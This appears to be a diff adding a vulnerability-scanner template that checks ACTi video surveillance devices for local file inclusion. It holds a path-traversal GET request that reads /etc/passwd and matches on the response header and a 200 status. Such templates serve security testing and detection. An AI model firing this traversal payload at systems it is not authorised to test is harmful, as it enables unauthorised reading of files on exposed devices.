@@ -1,0 +1,26 @@
+id: acti-video-lfi
+brief:
+    title: ACTi-Video Monitoring - Local File Inclusion
+    by: DhiyaneshDk
+    level: high
+    about: ACTI video surveillance has loopholes in reading any files
+    label:
+        - acti
+        - lfi
+        - iot
+        - video
+        - monitoring
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/images/../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
